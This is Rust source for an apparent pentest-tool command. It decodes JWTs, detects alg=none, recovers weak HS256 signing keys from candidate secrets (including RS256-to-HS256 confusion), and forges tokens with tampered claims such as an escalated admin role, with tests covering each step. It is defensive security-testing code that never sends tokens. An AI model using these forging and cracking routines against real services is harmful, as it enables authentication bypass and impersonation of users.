// #8 — JWT weakness analyzer + forge. Operator command, LOCAL compute only: it
// decodes a JWT, flags alg=none, and tries operator-provided candidate secrets
// against an HS256 signature to recover the signing key; if it recovers one (or
// the token is alg=none) it also FORGES a token (optionally with tampered claims)
// for the operator to test.
//
// Why local-only / no send: the brokered transport deliberately strips agent-set
// Authorization/Cookie headers (agent_tools.rs AGENT_CREDENTIAL_HEADERS), so a
// forged credential cannot be smuggled onto the wire by the agent — a real safety
// control that keeps the recorded identity matching what is sent. To actually probe
// the target with a forged token, the operator registers it as a session identity
// (human-in-the-loop) and the normal identity-based probing tests it. This command
// therefore only produces the forged token + the weakness finding; it never sends.
//
// RS256→HS256 algorithm confusion is covered without extra code: pass the server's
// RSA PUBLIC key (PEM) as a candidate secret — if the server verifies HS256 with
// the public key as the HMAC secret, the crack below finds it.
//
// HMAC-SHA256 is implemented over the existing `sha2` dependency (no new crate).

/// Minimal HMAC-SHA256 (RFC 2104) over the project's existing sha2. 64-byte block.
fn hmac_sha256(key: &[u8], message: &[u8]) -> [u8; 32] {
    let mut block = [0u8; 64];
    if key.len() > 64 {
        let digest = Sha256::digest(key);
        block[..32].copy_from_slice(&digest);
    } else {
        block[..key.len()].copy_from_slice(key);
    }
    let mut ipad = [0u8; 64];
    let mut opad = [0u8; 64];
    for i in 0..64 {
        ipad[i] = block[i] ^ 0x36;
        opad[i] = block[i] ^ 0x5c;
    }
    let mut inner = Sha256::new();
    inner.update(ipad);
    inner.update(message);
    let inner = inner.finalize();
    let mut outer = Sha256::new();
    outer.update(opad);
    outer.update(inner);
    outer.finalize().into()
}

fn b64url_encode(bytes: &[u8]) -> String {
    base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(bytes)
}
fn b64url_decode(text: &str) -> Option<Vec<u8>> {
    base64::engine::general_purpose::URL_SAFE_NO_PAD.decode(text).ok()
}

struct DecodedJwt {
    header: JsonValue,
    payload: JsonValue,
    alg: String,
    signing_input: String, // "header.payload" exactly as in the token
    signature_b64: String, // the token's 3rd segment (may be empty)
}

/// Split and decode a compact JWS. Returns None if it is not three dot-separated
/// base64url segments with JSON header/payload.
fn decode_jwt(token: &str) -> Option<DecodedJwt> {
    let token = token.trim();
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() != 3 {
        return None;
    }
    let header: JsonValue = serde_json::from_slice(&b64url_decode(parts[0])?).ok()?;
    let payload: JsonValue = serde_json::from_slice(&b64url_decode(parts[1])?).ok()?;
    let alg = header
        .get("alg")
        .and_then(JsonValue::as_str)
        .unwrap_or("")
        .to_string();
    Some(DecodedJwt {
        header,
        payload,
        alg,
        signing_input: format!("{}.{}", parts[0], parts[1]),
        signature_b64: parts[2].to_string(),
    })
}

/// Try each candidate secret as the HS256 key over the token's signing input. On a
/// match, return the candidate's index (never the secret value, to avoid logging
/// it). Only meaningful for HS256 tokens.
fn crack_hs256(signing_input: &str, signature_b64: &str, candidates: &[String]) -> Option<usize> {
    let expected = signature_b64.trim();
    if expected.is_empty() {
        return None;
    }
    candidates.iter().position(|secret| {
        b64url_encode(&hmac_sha256(secret.as_bytes(), signing_input.as_bytes())) == expected
    })
}

/// Merge `overrides` (a JSON object) into `payload`, returning the tampered payload.
/// Non-object overrides are ignored.
fn apply_claim_overrides(payload: &JsonValue, overrides: &JsonValue) -> JsonValue {
    let mut out = payload.clone();
    if let (Some(base), Some(extra)) = (out.as_object_mut(), overrides.as_object()) {
        for (k, v) in extra {
            base.insert(k.clone(), v.clone());
        }
    }
    out
}

/// Forge an alg=none token for the given (possibly tampered) payload: header
/// {"alg":"none","typ":"JWT"}, the payload, and an empty signature segment.
fn forge_alg_none(payload: &JsonValue) -> String {
    let header = serde_json::json!({"alg":"none","typ":"JWT"});
    let h = b64url_encode(header.to_string().as_bytes());
    let p = b64url_encode(payload.to_string().as_bytes());
    format!("{h}.{p}.")
}

/// Forge an HS256 token signed with `secret` for the given payload.
fn forge_hs256(payload: &JsonValue, secret: &str) -> String {
    let header = serde_json::json!({"alg":"HS256","typ":"JWT"});
    let h = b64url_encode(header.to_string().as_bytes());
    let p = b64url_encode(payload.to_string().as_bytes());
    let signing_input = format!("{h}.{p}");
    let sig = b64url_encode(&hmac_sha256(secret.as_bytes(), signing_input.as_bytes()));
    format!("{signing_input}.{sig}")
}

#[tauri::command]
pub fn analyze_jwt(
    state: State<AppState>,
    scan_id: String,
    token: String,
    candidate_secrets: Option<Vec<String>>,
    claims_override: Option<JsonValue>,
) -> Result<JsonValue, String> {
    if scan_id.trim().is_empty() || scan_id.contains('/') || scan_id.contains("..") {
        return Err("任务 ID 非法".into());
    }
    let decoded = decode_jwt(&token).ok_or("不是有效的 JWT(需三段 base64url,头/载荷为 JSON)")?;
    let connection = db::open(&state.db_path)?;
    let exists: bool = connection
        .query_row("SELECT EXISTS(SELECT 1 FROM sentinel_scans WHERE id=?1)", [&scan_id], |r| r.get(0))
        .map_err(|e| e.to_string())?;
    if !exists {
        return Err("任务不存在".into());
    }

    let candidates = candidate_secrets.unwrap_or_default();
    let overrides = claims_override.unwrap_or(JsonValue::Null);
    let tampered_payload = apply_claim_overrides(&decoded.payload, &overrides);

    let alg_lower = decoded.alg.to_ascii_lowercase();
    let is_none = alg_lower == "none" || decoded.signature_b64.trim().is_empty();
    let is_hs256 = alg_lower == "hs256";
    let is_symmetric = matches!(alg_lower.as_str(), "hs256" | "hs384" | "hs512");

    // Recover the HS256 signing key from the candidates (covers RS256→HS256
    // confusion when a public-key PEM is passed as a candidate).
    let cracked_index = if is_hs256 {
        crack_hs256(&decoded.signing_input, &decoded.signature_b64, &candidates)
    } else {
        None
    };

    // Forge a token the operator can test. alg=none always; HS256-with-recovered-
    // key when a secret was recovered.
    let mut forged = serde_json::Map::new();
    forged.insert("algNone".into(), serde_json::json!(forge_alg_none(&tampered_payload)));
    if let Some(index) = cracked_index {
        forged.insert(
            "hs256".into(),
            serde_json::json!(forge_hs256(&tampered_payload, &candidates[index])),
        );
    }

    let critical = is_none || cracked_index.is_some();
    let mut weaknesses: Vec<&str> = Vec::new();
    if is_none {
        weaknesses.push("alg_none");
    }
    if cracked_index.is_some() {
        weaknesses.push("weak_or_known_hmac_secret");
    }
    if is_symmetric && !is_hs256 {
        weaknesses.push("symmetric_alg_not_cracked_in_v1");
    }

    if critical {
        let record = serde_json::json!({
            "alg": decoded.alg,
            "weaknesses": weaknesses,
            "crackedSecretIndex": cracked_index,
            "claimsTampered": overrides.is_object(),
            "detail": if is_none {
                "JWT 接受 alg=none / 无签名,可伪造任意身份"
            } else {
                "JWT 的 HS256 签名密钥可由候选密钥恢复(含 RS256→HS256 混淆),可伪造任意身份"
            }
        });
        let _ = connection.execute(
            "INSERT INTO sentinel_findings(scan_id,target_url,stage,kind,record_key,title,severity,record_json) \
             VALUES(?1,?2,'analysis','jwt_weakness',?3,?4,'critical',?5) \
             ON CONFLICT(scan_id,target_url,stage,kind,record_key) DO UPDATE SET \
             title=excluded.title,severity=excluded.severity,record_json=excluded.record_json,updated_at=datetime('now','localtime')",
            params![
                scan_id,
                "jwt",
                format!("jwt:{}", &decoded.signing_input[..decoded.signing_input.len().min(24)]),
                "JWT 可伪造(认证绕过)",
                record.to_string()
            ],
        );
    }

    Ok(serde_json::json!({
        "header": decoded.header,
        "payload": decoded.payload,
        "alg": decoded.alg,
        "algNone": is_none,
        "symmetric": is_symmetric,
        "crackedSecretIndex": cracked_index,
        "weaknesses": weaknesses,
        "forgedTokens": forged,
        "sendHint": "本命令不发送。要用伪造 token 验证越权,请把它注册为该任务的登录会话身份(人工),再用常规身份化探测——这样保留了凭据完整性控制。",
    }))
}

#[cfg(test)]
mod jwt_analyzer_tests {
    use super::*;

    // A known HS256 JWT: header{alg:HS256,typ:JWT}, payload{sub:1234567890,role:user}, secret "secret123".
    fn make_hs256(secret: &str, payload: &JsonValue) -> String {
        forge_hs256(payload, secret)
    }

    #[test]
    fn hmac_sha256_matches_known_vector() {
        // RFC-style check: HMAC-SHA256(key="key", msg="The quick brown fox jumps over the lazy dog")
        // = f7bc83f430538424b13298e6aa6fb143 ef4d59a14946175997479dbc2d1a3cd8
        let mac = hmac_sha256(b"key", b"The quick brown fox jumps over the lazy dog");
        let hex: String = mac.iter().map(|b| format!("{b:02x}")).collect();
        assert_eq!(hex, "f7bc83f430538424b13298e6aa6fb143ef4d59a14946175997479dbc2d1a3cd8");
    }

    #[test]
    fn decode_round_trips_header_and_payload() {
        let payload = serde_json::json!({"sub":"1234567890","role":"user"});
        let token = make_hs256("secret123", &payload);
        let d = decode_jwt(&token).unwrap();
        assert_eq!(d.alg, "HS256");
        assert_eq!(d.payload["role"], "user");
        assert!(!d.signature_b64.is_empty());
    }

    #[test]
    fn crack_finds_the_real_secret_and_rejects_others() {
        let payload = serde_json::json!({"sub":"1","role":"user"});
        let token = make_hs256("s3cr3t", &payload);
        let d = decode_jwt(&token).unwrap();
        let candidates = vec!["wrong".to_string(), "s3cr3t".to_string(), "other".to_string()];
        assert_eq!(crack_hs256(&d.signing_input, &d.signature_b64, &candidates), Some(1));
        let no_match = vec!["a".to_string(), "b".to_string()];
        assert_eq!(crack_hs256(&d.signing_input, &d.signature_b64, &no_match), None);
    }

    #[test]
    fn forged_hs256_with_cracked_secret_validates() {
        // Forge a tampered token with the recovered secret; it must verify under it.
        let payload = serde_json::json!({"sub":"1","role":"admin"});
        let token = forge_hs256(&payload, "s3cr3t");
        let d = decode_jwt(&token).unwrap();
        assert_eq!(crack_hs256(&d.signing_input, &d.signature_b64, &["s3cr3t".to_string()]), Some(0));
        assert_eq!(d.payload["role"], "admin");
    }

    #[test]
    fn alg_none_forge_has_empty_signature() {
        let payload = serde_json::json!({"role":"admin"});
        let token = forge_alg_none(&payload);
        assert!(token.ends_with('.'));
        let d = decode_jwt(&token).unwrap();
        assert_eq!(d.alg, "none");
        assert!(d.signature_b64.is_empty());
        assert_eq!(d.payload["role"], "admin");
    }

    #[test]
    fn claim_overrides_elevate_only_named_claims() {
        let payload = serde_json::json!({"sub":"1","role":"user","exp":123});
        let out = apply_claim_overrides(&payload, &serde_json::json!({"role":"admin"}));
        assert_eq!(out["role"], "admin");
        assert_eq!(out["sub"], "1");
        assert_eq!(out["exp"], 123);
        // Non-object override is a no-op.
        assert_eq!(apply_claim_overrides(&payload, &JsonValue::Null), payload);
    }

    #[test]
    fn non_jwt_is_rejected() {
        assert!(decode_jwt("not-a-jwt").is_none());
        assert!(decode_jwt("a.b").is_none());
    }
}
